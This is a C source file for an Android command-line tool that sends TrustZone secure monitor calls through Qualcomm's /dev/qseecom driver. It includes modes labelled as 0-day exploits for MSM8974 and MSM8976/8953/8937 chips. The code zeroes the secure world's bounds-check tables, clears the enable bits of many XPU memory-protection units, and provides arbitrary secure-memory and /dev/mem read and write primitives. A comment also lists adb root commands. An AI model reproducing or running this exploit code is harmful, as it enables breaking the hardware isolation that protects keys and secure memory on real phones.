#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <stdio.h>
#include <stdlib.h>
#include "qseecom.h"
#include <sys/mman.h>
#include <fcntl.h>
#include <string.h>
#include <ctype.h>
#include <unistd.h>

/*
#define TZ_SVC_APP_MGR                   1    // Application management 
#define SCM_SVC_BOOT                     1
#define TZ_SVC_LISTENER                  2     // Listener service management 
#define TZ_SVC_EXTERNAL                  3     // External image loading 
#define TZ_SVC_DLOAD_MODE                3
#define TZ_SVC_RPMB                      4     // RPMB 
#define TZ_SVC_KEYSTORE                  5     // Keystore management 
#define TZBSP_SVC_INFO                   6
#define SCM_SVC_SSD                      7
#define SCM_SVC_FUSE                     8
#define TZ_SVC_CRYPTO                    10
#define SVC_MEMORY_PROTECTION            12
#define TZ_SVC_ES                        16    // Enterprise Security
#define SCM_SVC_MDTP                     18
*/

#define BLACKLIST_CHECK_DWORD_ADDRESS 0x865F6F3C
#define AMT_BIG 0x866167D4
#define AMT_APP 0x86656A98
#define CODE_CAVE_ADDRESS 0x8661636C //PIMEM_DAL_HEAP
#define CODE_CAVE_SIZE (0x163840)

//TTBR0

#define tzbsp_clear_protect_mem_subsystem 0x200020D


                 
struct __attribute__((packed)) qseecom_send_raw_scm_req {
        uint32_t svc_id;
        uint32_t cmd_id;
        void *cmd_req_buf; /* in */
        unsigned int cmd_req_len; /* in */
        void *resp_buf; /* in/out */
        unsigned int resp_len; /* in/out */
};

struct __attribute__((packed)) qseecom_send_atomic_scm_req {
    uint32_t svc_id;
    uint32_t num_args;
    uint32_t arg1;
    uint32_t arg2;
    uint32_t arg3;
    uint32_t arg4;
};


struct __attribute__((packed)) qseecom_send_atomic_scm_req32 {
    uint32_t svc_id;
    uint32_t cmd_id;
    uint32_t num_args;
    uint32_t arg1;
    uint32_t arg2;
    uint32_t arg3;
    uint32_t arg4;
};



#define QSEECOM_IOCTL_SEND_RAW_SCM \
        _IOWR(QSEECOM_IOC_MAGIC, 22, struct qseecom_send_raw_scm_req)

#define QSEECOM_IOCTL_SEND_ATOMIC_SCM \
	_IOWR(QSEECOM_IOC_MAGIC, 25, struct qseecom_send_atomic_scm_req)

#define QSEECOM_IOCTL_SEND_RAW_SCM32 \
        _IOWR(QSEECOM_IOC_MAGIC, 22, struct qseecom_send_raw_scm_req32)

#define QSEECOM_IOCTL_SEND_ATOMIC_SCM32 \
	_IOWR(QSEECOM_IOC_MAGIC, 25, struct qseecom_send_atomic_scm_req32)

int svc_raw(int fd, uint32_t svc_id,uint32_t cmd_id,char* hex_cmd_buf,uint32_t resp_len)
{
    //Converting the hex string to a binary string
	unsigned cmd_req_len = strlen(hex_cmd_buf)/2;
	char* bin_cmd_req = malloc(cmd_req_len);
	for (int i=0; i<cmd_req_len; i++)
	      sscanf(hex_cmd_buf+i*2,"%2hhx", bin_cmd_req+i);


	//Sending the request
	struct qseecom_send_raw_scm_req raw_req;
	raw_req.svc_id = svc_id;
	raw_req.cmd_id = cmd_id;
	raw_req.cmd_req_len = cmd_req_len;
	raw_req.cmd_req_buf = bin_cmd_req;
	raw_req.resp_buf = malloc(resp_len);
	memset(raw_req.resp_buf, 'B', resp_len); //Visible garbage to see the actual change
	raw_req.resp_len = resp_len;
	int res = ioctl(fd, QSEECOM_IOCTL_SEND_RAW_SCM, &raw_req);
	if (res < 0) {
		perror("Failed to send raw SCM ioctl");
		return -errno;
	}
	printf("IOCTL RES: 0x%08X\n", (unsigned)res);
	
	//Printing the response buffer
	printf("Response Buffer:\n");
	uint32_t i;
	for (i=0; i<raw_req.resp_len; i++)
		printf("%02X", ((unsigned char*)raw_req.resp_buf)[i]);
	printf("\n");
	return 1;
}

int svc_reg64(int fd, uint32_t svc_id, uint32_t num_args, uint32_t arg1,uint32_t arg2,uint32_t arg3, uint32_t arg4)
{
	struct qseecom_send_atomic_scm_req req;
		req.svc_id = svc_id;
		req.num_args = num_args;
		if (req.num_args > 4) {
			printf("Illegal number of arguments supplied: %d\n", req.num_args);
			return -EINVAL;
		}
		req.arg1 = arg1;
		req.arg2 = arg2;
		req.arg3 = arg3;
		req.arg4 = arg4;
		int res = ioctl(fd, QSEECOM_IOCTL_SEND_ATOMIC_SCM, &req);
		return res;
}


int svc_reg32(int fd, uint32_t svc_id, uint32_t cmd_id, uint32_t num_args, uint32_t arg1,uint32_t arg2,uint32_t arg3, uint32_t arg4)
{
	struct qseecom_send_atomic_scm_req32 req;
		req.svc_id = svc_id;
		req.cmd_id = cmd_id;
		req.num_args = num_args;
		if (req.num_args > 4) {
			printf("Illegal number of arguments supplied: %d\n", req.num_args);
			return -EINVAL;
		}
		req.arg1 = arg1;
		req.arg2 = arg2;
		req.arg3 = arg3;
		req.arg4 = arg4;
		int res = ioctl(fd, QSEECOM_IOCTL_SEND_ATOMIC_SCM32, &req);
        //printf("IOCTL RES: %u\n", (unsigned)res);
		if (res < 0) {
			perror("Failed to send ioctl");
		}
		return res;
}



uint32_t readaddr(int fd,off_t address)
{
    unsigned mode=0;
    unsigned writedata=0;
    return svc_reg64(fd, tzbsp_clear_protect_mem_subsystem,4,mode,address,writedata,0);
}

uint32_t writeaddr(int fd,off_t address, uint32_t writedata)
{
    uint32_t mode=0x22;
    return svc_reg64(fd, tzbsp_clear_protect_mem_subsystem,4,mode,address,writedata,0);
}

int writecave(int fd, off_t address, unsigned char* data, uint32_t length)
{
    uint32_t i=0;
    uint32_t* dataptr=(uint32_t*)&data[0];
    
    uint32_t addrptr=address;
    for (i=0; i < (length/4); i++)
    {
        writeaddr(fd,addrptr,dataptr[i]);
        addrptr+=4;
    }
    
    uint32_t mlen=(uint32_t)(length%4);
    if (mlen!=0)
    {
        uint32_t val=readaddr(fd,addrptr);
        if (mlen==1)
        {
            val=(val&0x00FFFFFF)+(data[length-1]<<24);
        }
        else if (mlen==2)
        {
            val=(val&0x0000FFFF)+(data[length-1]<<24)+(data[length-2]<<16);
        }
        else if (mlen==3)
        {
            val=(val&0x000000FF)+(data[length-1]<<24)+(data[length-2]<<16)+(data[length-3]<<8);
        }
    }
    return 0;
}

int writememory(off_t address, unsigned char* data, uint32_t length)
{
  void *map_base, *virt_addr;
  unsigned page_size, mapped_size, offset_in_page;
  unsigned width = 8 * length;

  page_size = sysconf(_SC_PAGESIZE);
  

  int fd, i;
  fd=open("/dev/mem", O_RDWR|O_SYNC|O_LARGEFILE);
  if (fd < 0)
  {
     fprintf(stderr, "Error on opening of /dev/mem\n");
     return -1;
  }

  mapped_size=page_size;

   offset_in_page = (unsigned)address & (page_size - 1);
   if (offset_in_page + width > page_size) 
   {
        mapped_size *= 2;
   }
   
  uint32_t adf=address & ~(page_size-1);
  //printf("Mapping memory at %08X, mapped_size=%d\n",adf,mapped_size);
  map_base = (char *)mmap64(0, mapped_size, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_SHARED, fd, adf);
  if (map_base == MAP_FAILED)
  {
  	printf("Error on mapping memory\n");
  	exit(2);
  }
  virt_addr = (char*)map_base + offset_in_page;

  //printf("Writing memory\n");

  for (i=0; i < length; i++)
  {
  	virt_addr = (char*)map_base + offset_in_page + i;
     *(volatile uint8_t*)virt_addr=data[i];
  }

//printf("Comparing memory\n");
 
  for (i=0; i < length; i++)
  {
  	 virt_addr = (char*)map_base + offset_in_page + i;
     //uint64_t read_result = *(volatile uint32_t*)virt_addr;
  	 //printf("Value: %02X\n",(uint8_t)*(volatile uint8_t*)virt_addr);

     if (data[i]!=*(volatile uint8_t*)virt_addr)
     {
     	printf("Memory error\n");
     	break;
     }
  }
 
  //printf("Unmapping memory\n");
  munmap(map_base, mapped_size);
  close(fd);
  return 1;
}

int readmemory(off_t address, unsigned char* data, uint32_t length)
{
  void *map_base, *virt_addr;
  unsigned page_size, mapped_size, offset_in_page;
  unsigned width = 8 * length;

  page_size = sysconf(_SC_PAGESIZE);
  

  int fd, i;
  fd=open("/dev/mem", O_RDWR|O_SYNC|O_LARGEFILE);
  if (fd < 0)
  {
     fprintf(stderr, "Error on opening of /dev/mem\n");
     return -1;
  }

  mapped_size=page_size;

   offset_in_page = (unsigned)address & (page_size - 1);
   if (offset_in_page + width > page_size) 
   {
        mapped_size *= 2;
   }
   
  uint32_t adf=address & ~(page_size-1);
  //printf("Mapping memory at %08X, mapped_size=%d\n",adf,mapped_size);
  map_base = (char *)mmap64(0, mapped_size, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_SHARED, fd, adf);
  if (map_base == MAP_FAILED)
  {
  	printf("Error on mapping memory\n");
  	exit(2);
  }
  virt_addr = (char*)map_base + offset_in_page;

  //printf("Comparing memory\n");
 
  for (i=0; i < length; i++)
  {
  	 virt_addr = (char*)map_base + offset_in_page + i;
     //uint64_t read_result = *(volatile uint32_t*)virt_addr;
  	 //printf("%02X",(uint8_t)*(volatile uint8_t*)virt_addr);
     data[i]=*(volatile uint8_t*)virt_addr;
  }
 
  //printf("Unmapping memory\n");
  munmap(map_base, mapped_size);
  close(fd);
  return 1;
}


void disable_ns_bounds_checks64(int fd)
{
    writeaddr(fd,BLACKLIST_CHECK_DWORD_ADDRESS,0);
    for (uint32_t addr=AMT_BIG;addr<AMT_BIG+0x9FD;addr+=4) //amt_big
    {
        writeaddr(fd,addr,0);
    }
    for (uint32_t addr=AMT_APP;addr<AMT_APP+0x1FC+1;addr+=4) //amt_app
    {
        writeaddr(fd,addr,0);
    }
}

static unsigned long long ret_ERANGE(void)
{
	errno = ERANGE; /* this ain't as small as it looks (on glibc) */
	return ULLONG_MAX;
}

static unsigned long long handle_errors(unsigned long long v, char **endp)
{
	char next_ch = **endp;

	/* errno is already set to ERANGE by strtoXXX if value overflowed */
	if (next_ch) {
		/* "1234abcg" or out-of-range? */
		if (isalnum(next_ch) || errno)
			return ret_ERANGE();
		/* good number, just suspicious terminator */
		errno = EINVAL;
	}
	return v;
}

unsigned long long bb_strtoull(const char *arg, char **endp, int base)
{
	unsigned long long v;
	char *endptr;

	if (!endp) endp = &endptr;
	*endp = (char*) arg;

	/* strtoul("  -4200000000") returns 94967296, errno 0 (!) */
	/* I don't think that this is right. Preventing this... */
	if (!isalnum(arg[0])) return ret_ERANGE();

	/* not 100% correct for lib func, but convenient for the caller */
	errno = 0;
	v = strtoull(arg, endp, base);
	return handle_errors(v, endp);
}

char* strchrnul(const char *s, int c)
{
	while (*s != '\0' && *s != c)
		s++;
	return (char*)s;
}


static int devmem_main(char **argv)
{
	void *map_base, *virt_addr;
	uint64_t read_result;
	uint64_t writeval = 0;
	off_t target;
	unsigned page_size, mapped_size, offset_in_page;
	int fd;
	unsigned width = 8 * sizeof(int);

	/* ADDRESS */
	if (!argv[2])
    {
		printf("USAGE: %s devmem <addr> <width[8,16,32,64]> <value_to_write>\n", argv[0]);
        printf("Example: devmem 0x865ef918 32 0x86572214\n");
        return 0;
    }
	errno = 0;
	target = strtoull(argv[2], NULL, 0); /* allows hex, oct etc */
	/* WIDTH */
	if (argv[3]) {
		if (isdigit(argv[3][0]) || argv[3][1])
			width = (unsigned)strtoll(argv[3], NULL, 10);
		else {
			static const char bhwl[5] = "bhwl";
			static const uint8_t sizes[5] = {
				8 * sizeof(char),
				8 * sizeof(short),
				8 * sizeof(int),
				8 * sizeof(long),
				0 /* bad */
			};
			width = strchrnul(bhwl, (argv[3][0] | 0x20)) - bhwl;
			width = sizes[width];
		}
		/* VALUE */
		if (argv[4])
			writeval = bb_strtoull(argv[4], NULL, 0);
	} else { /* argv[2] == NULL */
		/* make argv[3] to be a valid thing to fetch */
		argv--;
	}
	if (errno)
    {
		printf("Error on arguments\n");
        printf("USAGE: %s devmem <addr> <width[8,16,32,64]> <value_to_write>\n", argv[0]);
        return 0;
    }
	fd = open("/dev/mem", argv[4] ? (O_RDWR|O_SYNC|O_LARGEFILE) : (O_RDONLY|O_SYNC|O_LARGEFILE));
	if (fd < 0)
    {
        fprintf(stderr, "Error on opening of /dev/mem\n");
        return -1; 
    }
    mapped_size = page_size = sysconf(_SC_PAGESIZE);
	offset_in_page = (unsigned)target & (page_size - 1);
	if (offset_in_page + width > page_size) {
		/* This access spans pages.
		 * Must map two pages to make it possible: */
		mapped_size *= 2;
	}
    uint32_t adf=target & ~(page_size-1);
	map_base = mmap64(NULL,mapped_size,argv[4] ? (PROT_EXEC |PROT_READ | PROT_WRITE) : PROT_EXEC |PROT_READ, MAP_SHARED, fd, adf);
	if (map_base == MAP_FAILED)
    {
		printf("mmap error\n");
        return 0;
    }
//	printf("Memory mapped at address %p.\n", map_base);

	virt_addr = (char*)map_base + offset_in_page;

	if (!argv[4]) {
		switch (width) {
		case 8:
			read_result = *(volatile uint8_t*)virt_addr;
			break;
		case 16:
			read_result = *(volatile uint16_t*)virt_addr;
			break;
		case 32:
			read_result = *(volatile uint32_t*)virt_addr;
			break;
		case 64:
			read_result = *(volatile uint64_t*)virt_addr;
			break;
		default:
			printf("bad width");
		}
//		printf("Value at address 0x%"OFF_FMT"X (%p): 0x%llX\n",
//			target, virt_addr,
//			(unsigned long long)read_result);
		/* Zero-padded output shows the width of access just done */
		printf("0x%0*llX\n", (width >> 2), (unsigned long long)read_result);
	} else {
		switch (width) {
		case 8:
			*(volatile uint8_t*)virt_addr = writeval;
//			read_result = *(volatile uint8_t*)virt_addr;
			break;
		case 16:
			*(volatile uint16_t*)virt_addr = writeval;
//			read_result = *(volatile uint16_t*)virt_addr;
			break;
		case 32:
			*(volatile uint32_t*)virt_addr = writeval;
//			read_result = *(volatile uint32_t*)virt_addr;
			break;
		case 64:
			*(volatile uint64_t*)virt_addr = writeval;
//			read_result = *(volatile uint64_t*)virt_addr;
			break;
		default:
			printf("bad width");
		}
//		printf("Written 0x%llX; readback 0x%llX\n",
//				(unsigned long long)writeval,
//				(unsigned long long)read_result);
	}

		if (munmap(map_base, mapped_size) == -1)
			printf("munmap error");
		close(fd);

	return EXIT_SUCCESS;
}

void wipebit0(int fd, off_t addr)
{
        uint32_t val=0;
		val=readaddr(fd,addr);
		//printf("R:0x%08X\n",val);
		val &= ~(1UL << 0);
		//printf("W:0x%08X\n",val);
		writeaddr(fd,addr,val);
}

unsigned char* hexstr_to_char(const char* hexstr)
{
    size_t len = strlen(hexstr);
    if (len % 2 != 0)
        return NULL;
    size_t final_len = len / 2;
    unsigned char* chrs = (unsigned char*)malloc((final_len+1) * sizeof(*chrs));
    for (size_t i=0, j=0; j<final_len; i+=2, j++)
        chrs[j] = (hexstr[i] % 32 + 9) % 25 * 16 + (hexstr[i+1] % 32 + 9) % 25;
    chrs[final_len] = '\0';
    return chrs;
}

#define SCM_SVC_ES 0x10
#define SCM_IS_ACTIVATED_ID 0x2
#define IMEM_MPU 0xFC48B080

int zero_dword(int fd, uint32_t address)
{
	return svc_reg32(fd, SCM_SVC_ES, SCM_IS_ACTIVATED_ID,2,address,0,0,0);
}

#define BOUNDS_CHECK_DWORD_ADDRESS 0xFE828444
#define BOUNDS_CHECKS_RANGE_START 0xFE8304EC
#define BOUNDS_CHECKS_RANGE_END 0xFE8306E8

void disable_ns_bounds_checks(int fd)
{
    zero_dword(fd,BOUNDS_CHECK_DWORD_ADDRESS);
    for (uint32_t addr=BOUNDS_CHECKS_RANGE_START;addr<BOUNDS_CHECKS_RANGE_END+1;addr+=4)
                zero_dword(fd,addr);
}

int main(int argc, char **argv) {
    int i=0;
	//Reading the command-line arguments
	if (argc < 2) {
		printf("USAGE: %s <MODE> where MODE=svcreg32,svcreg64,svcraw,exploit8974,exploit8976,svcread,svcwrite,devmem,readmem,writemem\n",argv[0]);
		return -EINVAL;
	}
	char* mode = argv[1];

        //Opening the QSEECOM device
        int fd = open("/dev/qseecom", O_RDONLY);
        if (fd < 0) {
                perror("Failed to open /dev/qseecom");
                return -errno;
        }
        //printf("FD: %d\n", fd);

	
	//Checking if this is an atomic call
	if (strstr(mode, "svcreg32") == mode) {

		//Reading the arguments from the user
		if (argc < 3) {
			printf("USAGE: %s svcreg32 <SMC_ID> <CMD_ID> <NUM_ARGS> <HEX ARGS...>\n", argv[0]);
			return -EINVAL;
		}
		uint32_t svc_id = (unsigned)strtoll(argv[2], NULL, 16);
		uint32_t cmd_id = (unsigned)strtoll(argv[3], NULL, 16);
		uint32_t num_args = atoi(argv[4]);
		uint32_t arg1=0;
		uint32_t arg2=0;
		uint32_t arg3=0;
		uint32_t arg4=0;

		if (num_args > 0)
			arg1 = (unsigned)strtoll(argv[5], NULL, 16);
		if (num_args > 1)
			arg2 = (unsigned)strtoll(argv[6], NULL, 16);
        if (num_args > 2)
            arg3 = (unsigned)strtoll(argv[7], NULL, 16);
		if (num_args > 3)
			arg4 = (unsigned)strtoll(argv[8], NULL, 16);
        printf("Sending SVC: 0x%x, CMD: 0x%x\n",svc_id,cmd_id);
		int res=svc_reg32(fd,svc_id,cmd_id,num_args,arg1,arg2,arg3,arg4);
        printf("IOCTL RES: 0x%08X\n", (unsigned)res);
	}	
	else if (strstr(mode, "svcreg64") == mode) {

		//Reading the arguments from the user
		if (argc < 3) {
			printf("USAGE: %s svcreg64 <SMC_ID> <NUM_ARGS> <HEX ARGS...>\n", argv[0]);
			return -EINVAL;
		}
		uint32_t svc_id = (unsigned)strtoll(argv[2], NULL, 16);
		uint32_t num_args = atoi(argv[3]);
		uint32_t arg1=0;
		uint32_t arg2=0;
		uint32_t arg3=0;
		uint32_t arg4=0;

		if (num_args > 0)
			arg1 = (unsigned)strtoll(argv[4], NULL, 16);
		if (num_args > 1)
			arg2 = (unsigned)strtoll(argv[5], NULL, 16);
        if (num_args > 2)
            arg3 = (unsigned)strtoll(argv[6], NULL, 16);
		if (num_args > 3)
			arg4 = (unsigned)strtoll(argv[7], NULL, 16);
        printf("Sending SVC: 0x%x\n",svc_id);
		int res=svc_reg64(fd,svc_id,num_args,arg1,arg2,arg3,arg4);
        printf("IOCTL RES: 0x%08X\n", (unsigned)res);
	}
	//Checking if this is a raw call
	else if (strstr(mode, "svcraw") == mode) {

		if (argc != 6) {
			printf("USAGE: %s svcraw <SVC_ID> <CMD_ID> <REQ_BUF> <RESP_LEN>\n", argv[0]);
			return -EINVAL;
		}
			uint32_t svc_id = atoi(argv[2]);
		   	uint32_t cmd_id = atoi(argv[3]);
    		char* hex_cmd_buf = argv[4];
			uint32_t resp_len = atoi(argv[5]);

	        svc_raw(fd,svc_id,cmd_id,hex_cmd_buf,resp_len);
	}
	else if (strstr(mode, "exploit8974") == mode)
	{
		printf("MSM8974 TZ 0-day exploit by B.Kerler 2017\n");
		printf("----------------------------------------------------------\n");
		printf("Disable NS Blacklist\n");
		disable_ns_bounds_checks(fd);
		
		printf("Zeroing out IMEM\n");
		zero_dword(fd,IMEM_MPU);

		printf("Refreshing NS Blacklist\n");
		unsigned char value=0x2;
		writememory(BOUNDS_CHECK_DWORD_ADDRESS,(unsigned char*)&value,4);

		printf("Done exploiting\n");
	}
	else if (strstr(mode, "exploit8976") == mode) 
	{
		printf("\nMSM8976/8953/8937 Qualcomm TZ 0-day exploit by B.Kerler 2018\n");
		printf("----------------------------------------------------------\n");
		/*printf("Disable NS Blacklist\n");
		disable_ns_bounds_checks(fd);*/
        printf("Mounting Debugfs\n");
        system("mount -t debugfs debugfs /d/");
        
		printf("Disabling HWIO_BOOT_ROM_XPU\n");
        wipebit0(fd,0x1ff080); //HWIO_BOOT_ROM_XPU_CR_ADDR
        wipebit0(fd,0x1ff000); //HWIO_BOOT_ROM_XPU_SCR_ADDR

		printf("Disabling HWIO_MPM2_XPU\n");
        wipebit0(fd,0x4a7080); //HWIO_MPM2_XPU_CR_ADDR
        wipebit0(fd,0x4a7000); //HWIO_MPM2_XPU_SCR_ADDR

		printf("Disabling HWIO_TLMM_XPU\n");
        wipebit0(fd,0x1300080); //HWIO_TLMM_XPU_CR_ADDR
        wipebit0(fd,0x1300000); //HWIO_TLMM_XPU_SCR_ADDR
        
        printf("Disabling HWIO_XPU_CFG_SNOC_CFG_XPU\n");
        wipebit0(fd,0x2d080); //HWIO_XPU_CFG_SNOC_CFG_XPU_CR_ADDR
        wipebit0(fd,0x2d000); //HWIO_XPU_CFG_SNOC_CFG_XPU_SCR_ADDR
        
        printf("Disabling HWIO_GCC_RPU_XPU\n");
        wipebit0(fd,0x1880080); //HWIO_GCC_RPU_XPU_CR_ADDR
        wipebit0(fd,0x1880000); //HWIO_GCC_RPU_XPU_SCR_ADDR

        printf("Disabling HWIO_TCSR_REGS_XPU\n");
        wipebit0(fd,0x1936080); //HWIO_TCSR_REGS_XPU_CR_ADDR
        wipebit0(fd,0x1936000); //HWIO_TCSR_REGS_XPU_SCR_ADDR
        
        printf("Disabling HWIO_XPU_CFG_SNOC_CFG_XPU\n");
        wipebit0(fd,0x2d080); //HWIO_XPU_CFG_SNOC_CFG_XPU_CR_ADDR
        wipebit0(fd,0x2d000); //HWIO_XPU_CFG_SNOC_CFG_XPU_SCR_ADDR
        
        printf("Disabling HWIO_MSS_XPU\n");
        wipebit0(fd,0x4000080); //HWIO_MSS_XPU_CR_ADDR
        wipebit0(fd,0x4000000); //HWIO_MSS_XPU_SCR_ADDR
        
        printf("Disabling HWIO_RPM_APU_XPU\n");
        wipebit0(fd,0x287080); //HWIO_RPM_APU_XPU_CR_ADDR
        wipebit0(fd,0x287000); //HWIO_RPM_APU_XPU_SCR_ADDR
        
        printf("Disabling HWIO_WCSS_A_XPU_XPU\n");
        wipebit0(fd,0xa21f080); //HWIO_WCSS_A_XPU_XPU_CR_ADDR
        wipebit0(fd,0xa21f000); //HWIO_WCSS_A_XPU_XPU_SCR_ADDR
        
        printf("Disabling HWIO_XPU_CFG_PCNOC_CFG_XPU\n");
        wipebit0(fd,0x2e080); //HWIO_XPU_CFG_PCNOC_CFG_XPU_CR_ADDR
        wipebit0(fd,0x2e000); //HWIO_XPU_CFG_PCNOC_CFG_XPU_SCR_ADDR

        printf("Disabling HWIO_OCIMEM_MPU_XPU\n");
        wipebit0(fd,0x53080); //HWIO_OCIMEM_MPU_XPU_CR_ADDR
        wipebit0(fd,0x53000); //HWIO_OCIMEM_MPU_XPU_SCR_ADDR
        
        printf("Disabling HWIO_OCIMEM_MPU_XPU\n");
        wipebit0(fd,0x44a080); //HWIO_OCIMEM_MPU_XPU_CR_ADDR
        wipebit0(fd,0x44a000); //HWIO_OCIMEM_MPU_XPU_SCR_ADDR
        
        /*HWIO_SEC_CTRL_APU_XPU_CR_ADDR A:0x5f080 - reboot
        HWIO_CRYPTO0_CRYPTO_BAM_XPU_CR_ADDR A:0x702080 - reboot
        HWIO_BLSP1_BLSP_BAM_XPU_CR_ADDR A:0x7882080 - reboot
        HWIO_XPU_CFG_RPM_CFG_XPU_CR_ADDR A:0x33080 - reboot
        HWIO_DEHR_XPU_CR_ADDR A:0x4b0080 - reboot
        HWIO_XPU_CFG_PRNG_CFG_XPU_CR_ADDR A:0x2f080 - reboot
        HWIO_VENUS0_VENUS_XPU_CR_ADDR A:0x1df0080 - reboot*/

        /*
        REM Here is the important stuff :
        echo HWIO_OCIMEM_MPU_XPU_CR_ADDR A:0x53080 0x0000011F
        adb shell su -c "/data/local/tmp/fuzz_zone reg 200020D 4 22 53080 11e 0" 
        echo #HWIO_OCIMEM_MPU_XPU_SCR_ADDR
        adb shell su -c "/data/local/tmp/fuzz_zone reg 200020D 4 22 53000 13e 0" 
        echo #HWIO_BIMC_S_DDR0_XPU_CR_ADDR
        adb shell su -c "/data/local/tmp/fuzz_zone reg 200020D 4 22 44a080 19e 0"
        echo #HWIO_BIMC_S_DDR0_XPU_SCR_ADDR
        adb shell su -c "/data/local/tmp/fuzz_zone reg 200020D 4 22 44a000 13e 0" 
        */
        
		printf("Done exploiting\n\n");
		return 0;
	}
    else if (strstr(mode, "svcread") == mode) {

		//Reading the arguments from the user
		if (argc < 4) {
			printf("USAGE: %s read <addr> <len> opt:<file>\n", argv[0]);
			return -EINVAL;
		}
		uint32_t addr = (unsigned)strtoll(argv[2], NULL, 16);
		uint32_t len = (unsigned)strtoll(argv[3], NULL, 16);
        printf("Sending SVC: 0x%x\n",tzbsp_clear_protect_mem_subsystem);
        printf("Data:\n");
		FILE* pFile=NULL;
		if (argc == 5)
		{
			pFile=fopen(argv[4],"w");
		}
		
        for (i=0;i<len;i+=4)
        {
			uint32_t X0=readaddr(fd,addr+i);
			if (len<=4) printf("0x%08X\n",X0);
			X0=(X0 & 0x000000ff) << 24 | (X0 & 0x0000ff00) << 8 | (X0 & 0x00ff0000) >> 8 | (X0 & 0xff000000) >> 24;
            printf("%08X",X0);
			if (pFile!=NULL)
			{
				fwrite(&X0,4,4,pFile);
			}
        }
		if (pFile!=NULL)
		{
			fclose(pFile);
		}
        printf("\n");
		return 0;
	}
	else if (strstr(mode, "svcwrite") == mode) {

		//Reading the arguments from the user
		if (argc < 4) {
			printf("USAGE: %s write <addr> <dword>\n", argv[0]);
			return -EINVAL;
		}
		uint32_t addr = (unsigned)strtoll(argv[2], NULL, 16);
		uint32_t data = (unsigned)strtoll(argv[3], NULL, 16);
        printf("Sending SVC: 0x%x\n",tzbsp_clear_protect_mem_subsystem);
		uint32_t X0=writeaddr(fd,addr,data);
		printf("Result: 0x%08X\n",X0);
        printf("\n");
		return 0;
	}
    else if (strstr(mode, "devmem") == mode){
        return devmem_main(argv);
    }
    else if (strstr(mode, "writemem") == mode){
        if (argc < 4) {
			printf("USAGE: %s writemem <addr> <data_as_hexstring>\n", argv[0]);
			return -EINVAL;
		}
		off_t addr = (unsigned)strtoull(argv[2], NULL, 16);
        unsigned int datalen=strlen(argv[3])/2;
        unsigned char* data=hexstr_to_char(argv[3]);
        if (data!=NULL)
        {
            writememory(addr, data, datalen);
            free(data);
            return 0;
        }
    }
    else if (strstr(mode, "readmem") == mode){
        if (argc < 4) {
			printf("USAGE: %s readmem <addr> <length>\n", argv[0]);
			return -EINVAL;
		}
		off_t addr = (unsigned)strtoull(argv[2], NULL, 16);
        off_t datalen = (unsigned)strtoull(argv[3], NULL, 16);
        unsigned char* data=(unsigned char*)malloc(datalen);
        if (data!=NULL)
        {
            if (readmemory(addr, data, datalen))
            {
                printf("Memory read:\n");
                for (off_t i=0;i<datalen;i++)
                {
                    printf("%02X",data[i]);
                }
                printf("\n");
            }
            else printf("Error on reading memory.");
            free(data);
            return 0;
        } else printf("Couldn't alloc memory for reading.");
    }
	else {
		printf("Unknown mode %s!\n", mode);
		return -EINVAL;
	}
}
